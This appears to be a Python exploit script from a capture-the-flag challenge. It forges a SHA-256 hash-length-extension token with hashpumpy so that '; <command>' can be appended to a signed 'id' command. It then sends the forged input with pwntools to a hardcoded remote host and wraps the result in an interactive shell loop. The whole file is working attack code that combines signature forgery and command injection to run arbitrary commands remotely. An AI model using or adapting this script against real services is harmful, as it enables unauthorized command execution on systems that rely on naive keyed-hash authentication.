# To remove pesky warnings ; https://stackoverflow.com/a/879249/6262617
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

import hashpumpy
from pwn import *

# To remove remote(...) logs
context.log_level = 'ERROR'

ID_HASH = '69a4061766769d0a19ab59e6f905f7ac5875691b62765cb6b3b5ee6ae08f776a'
KEY_LEN = 22

def get_output(token, command):
    r = remote('144.217.73.235', 27099)
    r.recvuntil(ID_HASH + '\n')
    r.sendline(command + b'|' + token.encode())
    data = r.recvall()
    if b'Bad Token' in data:
        return None
    return data

def inject_command(command):
    injected_command = f'; {command}'
    token, command = hashpumpy.hashpump(ID_HASH, 'id', injected_command, KEY_LEN)
    output = get_output(token, command)
    output = output.decode().strip()
    # Remove original 'id' output
    output = '\n'.join(output.split('\n')[1:])
    return output

while True:
    try:
        cmd = input('$ ').strip()
    except:
        break

    if not cmd:
        break

    print(inject_command(cmd))

